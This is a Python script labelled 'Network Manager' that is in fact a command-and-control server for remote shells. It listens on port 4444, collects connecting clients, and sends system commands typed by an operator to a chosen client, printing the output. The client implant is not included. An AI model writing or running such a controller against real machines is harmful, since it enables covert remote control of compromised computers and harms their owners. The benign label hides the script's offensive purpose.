import socket
import threading


def menu():
    print("""~~~ Network Manager ~~~
-----------------------------
Options:
> 1) Show all clients
> 2) Execute a system command on a client""")


def show_all_clients(clients):
    if clients:
        print("[+] Clients list and index:")
        for index, client in enumerate(clients):
            print("{0} = {1}".format(index, client["address"][0]))
    else:
        print("[-] Currently there are no clients connected.")


def execute_client_command(clients):
    show_all_clients(clients)
    if clients:
        try:
            client_id = int(input("Select client >> "))
            if client_id > (len(clients)-1) or client_id < 0:
                print("[-] Client ID doesnt exist, index is set to 0 by default.")
                client_id = 0
        except:
            print("[-] Numbers only, index is set to 0 by default.")
            client_id = 0

        client = clients[client_id]["socket"]
        command = input("Execute command >> ")

        try:
            client.sendall(command.encode())
            output = client.recv(5000).decode()
            print(output)
        except:
            print("[-] Client error: removing client from the list, he will reconnect soon.")
            connections.pop(client_id)


def connection_handler():
    while True:
        client_socket, client_address = server.accept()
        connection = {"socket": client_socket, "address": client_address}
        connections.append(connection)


server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(("0.0.0.0", 4444))
server.listen(10)

connections = []
handler = threading.Thread(target=connection_handler)
handler.start()

while True:
    menu()

    try:
        option = int(input("Insert option > "))
    except:
        print("[-] Numbers only.")
        continue

    if option == 1:
        show_all_clients(connections)
    elif option == 2:
        execute_client_command(connections)
    else:
        print("[-] No such option.")
